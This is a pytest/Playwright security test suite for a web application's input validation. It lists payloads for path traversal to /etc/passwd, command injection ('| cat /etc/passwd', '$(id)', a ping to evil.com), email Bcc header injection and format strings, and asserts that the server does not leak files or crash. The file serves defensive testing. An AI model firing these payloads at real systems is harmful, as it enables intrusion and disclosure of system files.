"""
TEST 24 — Input Validation & Malformed Input Security

Tests the server's resilience to malformed, extreme, and attack-crafted inputs:
  1. OVERSIZED INPUT      — strings beyond field limits (buffer overflow patterns)
  2. NULL BYTES           — %00 injection in various fields
  3. UNICODE ATTACKS      — RTL override, homoglyph, zero-width chars
  4. PATH TRAVERSAL       — ../../ in file-like parameters
  5. COMMAND INJECTION    — ; ls, | cat, ` whoami` patterns
  6. FORMAT STRINGS       — %s %n %x printf-style
  7. XML/JSON INJECTION   — malformed structured data in body
  8. EMAIL FIELD ATTACKS  — header injection via email fields
  9. DATE FIELD ATTACKS   — invalid/extreme dates
 10. NUMBER FIELD ATTACKS — overflow, NaN, Infinity in numeric fields

URL: /projects, /people, /absence, /time, /invoicing, /settings
"""

import pytest
from playwright.sync_api import Page
from conftest import url, has_error

# ─── payload sets ─────────────────────────────────────────────────────────────

OVERSIZED = [
    "A" * 1000,
    "A" * 10000,
    "A" * 65536,
]

NULL_BYTES = [
    "hello%00world",
    "admin%00",
    "%00",
    "test\x00injection",
]

UNICODE_ATTACKS = [
    "‮Admin",  # RTL override "nimdA" → looks like "Admin"
    "﻿ admin",           # BOM + admin
    "ad​min",            # zero-width space
    "Admin",  # homoglyph Admin
    "𝐀𝐝𝐦𝐢𝐧",                # mathematical bold
]

PATH_TRAVERSAL = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//etc/passwd",
    "..\\..\\windows\\system32\\drivers\\etc\\hosts",
]

COMMAND_INJECTION = [
    "; ls -la",
    "| cat /etc/passwd",
    "`whoami`",
    "$(id)",
    "&& cat /etc/passwd",
    "|| cat /etc/passwd",
    "; ping -c 1 evil.com",
]

FORMAT_STRINGS = [
    "%s%s%s%s%s",
    "%n%n%n%n",
    "%x%x%x%x",
    "%.256d",
    "%99999999d",
]

INVALID_DATES = [
    "9999-99-99",
    "0000-00-00",
    "2027-13-01",
    "2027-01-32",
    "-1-01-01",
    "not-a-date",
    "2027/01/01",
    "01-01-2027",
]

INVALID_NUMBERS = [
    "-999999999",
    "999999999999999",
    "NaN",
    "Infinity",
    "-Infinity",
    "1.7976931348623157e+308",
    "0x1234",
    "1e999",
]

EMAIL_INJECTION = [
    "user@example.com\nBcc: attacker@evil.com",
    "user@example.com\r\nBcc: attacker@evil.com",
    "user%0d%0aBcc:attacker@evil.com@example.com",
    "attacker@evil.com%0a%0d",
]


def get_csrf(page: Page, path: str) -> str:
    page.goto(url(path))
    page.wait_for_load_state("networkidle")
    el = page.locator("input[name='_csrf']").first
    return el.input_value() if el.count() > 0 else ""


def submit_form(page: Page, action: str, data: dict):
    try:
        with page.expect_navigation(wait_until="networkidle", timeout=15000):
            page.evaluate("""([action, data]) => {
                const f = document.createElement('form');
                f.method = 'POST'; f.action = action;
                for (const [k, v] of Object.entries(data)) {
                    const i = document.createElement('input');
                    i.name = k; i.value = v; f.appendChild(i);
                }
                document.body.appendChild(f); f.submit();
            }""", [action, data])
    except Exception:
        try:
            page.wait_for_load_state("networkidle", timeout=10000)
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════════════════
# 1. OVERSIZED INPUT
# ══════════════════════════════════════════════════════════════════════════════

class TestOversizedInput:

    def test_oversized_project_name_rejected_gracefully(self, page):
        """10,000-char project name must not cause 500."""
        csrf = get_csrf(page, "/projects/new")
        submit_form(page, url("/projects"), {
            "name": "A" * 10000, "customer_id": "1",
            "budget_hours": "10", "_csrf": csrf
        })
        assert not has_error(page)

    def test_oversized_search_query(self, page):
        """10,000-char search query must not crash the server."""
        import urllib.parse
        long_query = urllib.parse.quote("A" * 10000)
        page.goto(url(f"/people?search={long_query}"))
        page.wait_for_load_state("networkidle")
        assert not has_error(page)

    def test_oversized_absence_notes(self, page):
        """65,536-char absence notes must be rejected or truncated, not crash."""
        csrf = get_csrf(page, "/absence/request")
        submit_form(page, url("/absence/request"), {
            "absence_type_id": "1",
            "start_date": "2028-03-01", "end_date": "2028-03-01",
            "notes": "X" * 65536, "_csrf": csrf
        })
        assert not has_error(page)

    def test_oversized_time_notes(self, page):
        """Very long time entry notes must not crash the server."""
        csrf = get_csrf(page, "/time/book")
        submit_form(page, url("/time/store"), {
            "project_id": "14", "date": "2028-03-01",
            "hours": "8", "notes": "Z" * 10000, "_csrf": csrf
        })
        assert not has_error(page)

    def test_oversized_settings_name(self, page):
        """Oversized name in settings profile update must not crash."""
        csrf = get_csrf(page, "/settings")
        submit_form(page, url("/settings"), {
            "name": "B" * 5000, "_csrf": csrf
        })
        assert not has_error(page)


# ══════════════════════════════════════════════════════════════════════════════
# 2. PATH TRAVERSAL
# ══════════════════════════════════════════════════════════════════════════════

class TestPathTraversal:

    @pytest.mark.parametrize("payload", PATH_TRAVERSAL)
    def test_path_traversal_in_search(self, page, payload):
        """Path traversal in search params must not expose server files."""
        import urllib.parse
        page.goto(url(f"/people?search={urllib.parse.quote(payload)}"))
        page.wait_for_load_state("networkidle")
        assert not has_error(page)
        content = page.content().lower()
        assert "root:x:" not in content, "Possible /etc/passwd leak"
        assert "localhost" not in content or "robomon" in page.url

    @pytest.mark.parametrize("payload", PATH_TRAVERSAL[:3])
    def test_path_traversal_in_project_name(self, page, payload):
        """Path traversal in project name field must not expose server files."""
        csrf = get_csrf(page, "/projects/new")
        submit_form(page, url("/projects"), {
            "name": payload, "customer_id": "1",
            "budget_hours": "10", "_csrf": csrf
        })
        assert not has_error(page)
        assert "root:x:" not in page.content()

    @pytest.mark.parametrize("payload", PATH_TRAVERSAL[:3])
    def test_path_traversal_in_url_segment(self, page, payload):
        """Path traversal in URL path segment must return 404 not expose files."""
        import urllib.parse
        page.goto(url(f"/people/{urllib.parse.quote(payload, safe='')}"))
        page.wait_for_load_state("networkidle")
        assert not has_error(page)
        assert "root:x:" not in page.content()


# ══════════════════════════════════════════════════════════════════════════════
# 3. COMMAND INJECTION
# ══════════════════════════════════════════════════════════════════════════════

class TestCommandInjection:

    @pytest.mark.parametrize("payload", COMMAND_INJECTION)
    def test_command_injection_in_project_name(self, page, payload):
        """Command injection in project name must not execute OS commands."""
        csrf = get_csrf(page, "/projects/new")
        submit_form(page, url("/projects"), {
            "name": payload, "customer_id": "1",
            "budget_hours": "10", "_csrf": csrf
        })
        assert not has_error(page)
        content = page.content().lower()
        assert "root" not in content or "robomon" in page.url
        assert "/etc/passwd" not in content

    @pytest.mark.parametrize("payload", COMMAND_INJECTION[:3])
    def test_command_injection_in_search(self, page, payload):
        """Command injection in search must not execute OS commands."""
        import urllib.parse
        page.goto(url(f"/people?search={urllib.parse.quote(payload)}"))
        page.wait_for_load_state("networkidle")
        assert not has_error(page)
        assert "/etc/passwd" not in page.content()


# ══════════════════════════════════════════════════════════════════════════════
# 4. INVALID DATE INPUTS
# ══════════════════════════════════════════════════════════════════════════════

class TestInvalidDateInputs:

    @pytest.mark.parametrize("date_val", INVALID_DATES)
    def test_invalid_absence_start_date(self, page, date_val):
        """Invalid dates in absence request must be rejected, not cause 500."""
        csrf = get_csrf(page, "/absence/request")
        submit_form(page, url("/absence/request"), {
            "absence_type_id": "1",
            "start_date": date_val, "end_date": date_val,
            "notes": "date-test", "_csrf": csrf
        })
        assert not has_error(page), f"500 on invalid date: {date_val}"

    @pytest.mark.parametrize("date_val", INVALID_DATES[:4])
    def test_invalid_invoice_date(self, page, date_val):
        """Invalid invoice date must be rejected gracefully."""
        csrf = get_csrf(page, "/invoicing/new")
        submit_form(page, url("/invoicing/new"), {
            "customer_id": "1", "project_id": "14",
            "invoice_date": date_val, "_csrf": csrf
        })
        assert not has_error(page), f"500 on invalid invoice date: {date_val}"

    @pytest.mark.parametrize("date_val", INVALID_DATES[:4])
    def test_invalid_time_entry_date(self, page, date_val):
        """Invalid date in time booking must be rejected gracefully."""
        csrf = get_csrf(page, "/time/book")
        submit_form(page, url("/time/store"), {
            "project_id": "14", "date": date_val,
            "hours": "8", "_csrf": csrf
        })
        assert not has_error(page), f"500 on invalid time date: {date_val}"


# ══════════════════════════════════════════════════════════════════════════════
# 5. INVALID NUMERIC INPUTS
# ══════════════════════════════════════════════════════════════════════════════

class TestInvalidNumericInputs:

    @pytest.mark.parametrize("hours_val", INVALID_NUMBERS)
    def test_invalid_hours_in_time_booking(self, page, hours_val):
        """Invalid numeric values in hours field must not cause 500."""
        csrf = get_csrf(page, "/time/book")
        submit_form(page, url("/time/store"), {
            "project_id": "14", "date": "2028-03-01",
            "hours": hours_val, "_csrf": csrf
        })
        assert not has_error(page), f"500 on hours value: {hours_val}"

    @pytest.mark.parametrize("budget_val", INVALID_NUMBERS)
    def test_invalid_budget_in_project(self, page, budget_val):
        """Invalid numeric budget values must not cause 500."""
        csrf = get_csrf(page, "/projects/new")
        submit_form(page, url("/projects"), {
            "name": f"BudgetTest-{budget_val[:5]}", "customer_id": "1",
            "budget_hours": budget_val, "_csrf": csrf
        })
        assert not has_error(page), f"500 on budget value: {budget_val}"

    @pytest.mark.parametrize("amount_val", ["NaN", "Infinity", "-Infinity", "1e999"])
    def test_invalid_payment_amount(self, page, amount_val):
        """Invalid payment amounts must not cause 500."""
        csrf = get_csrf(page, "/invoicing/99901")
        page.evaluate("""([action, data]) => {
            const f = document.createElement('form');
            f.method = 'POST'; f.action = action;
            for (const [k, v] of Object.entries(data)) {
                const i = document.createElement('input');
                i.name = k; i.value = v; f.appendChild(i);
            }
            document.body.appendChild(f); f.submit();
        }""", [url("/invoicing/99901/action"), {
            "action": "pay", "amount": amount_val, "_csrf": csrf
        }])
        page.wait_for_load_state("networkidle")
        assert not has_error(page), f"500 on payment amount: {amount_val}"


# ══════════════════════════════════════════════════════════════════════════════
# 6. EMAIL HEADER INJECTION
# ══════════════════════════════════════════════════════════════════════════════

class TestEmailHeaderInjection:

    @pytest.mark.parametrize("email_val", EMAIL_INJECTION)
    def test_email_header_injection_in_settings(self, page, email_val):
        """Email header injection in settings must not send unauthorised emails."""
        csrf = get_csrf(page, "/settings")
        submit_form(page, url("/settings"), {
            "email": email_val, "name": "Test", "_csrf": csrf
        })
        assert not has_error(page), f"500 on email injection: {email_val}"

    @pytest.mark.parametrize("email_val", EMAIL_INJECTION[:2])
    def test_email_header_injection_in_person_form(self, page, email_val):
        """Email header injection in person creation form must not send emails."""
        csrf = get_csrf(page, "/people/new")
        submit_form(page, url("/people/new"), {
            "first_name": "Test", "last_name": "User",
            "email": email_val, "_csrf": csrf
        })
        assert not has_error(page), f"500 on email injection in person: {email_val}"


# ══════════════════════════════════════════════════════════════════════════════
# 7. FORMAT STRING & UNICODE ATTACKS
# ══════════════════════════════════════════════════════════════════════════════

class TestFormatStringAndUnicode:

    @pytest.mark.parametrize("payload", FORMAT_STRINGS)
    def test_format_string_in_project_name(self, page, payload):
        """Printf-style format strings in project name must not be evaluated."""
        csrf = get_csrf(page, "/projects/new")
        submit_form(page, url("/projects"), {
            "name": payload, "customer_id": "1",
            "budget_hours": "10", "_csrf": csrf
        })
        assert not has_error(page), f"500 on format string: {payload}"

    @pytest.mark.parametrize("payload", UNICODE_ATTACKS)
    def test_unicode_attack_in_search(self, page, payload):
        """Unicode homoglyph and control char attacks must be handled safely."""
        import urllib.parse
        page.goto(url(f"/people?search={urllib.parse.quote(payload)}"))
        page.wait_for_load_state("networkidle")
        assert not has_error(page), f"500 on unicode attack: {repr(payload)}"

    def test_null_byte_in_project_name(self, page):
        """Null bytes in project name must not crash or truncate dangerously."""
        csrf = get_csrf(page, "/projects/new")
        submit_form(page, url("/projects"), {
            "name": "Safe\x00Unsafe", "customer_id": "1",
            "budget_hours": "10", "_csrf": csrf
        })
        assert not has_error(page)
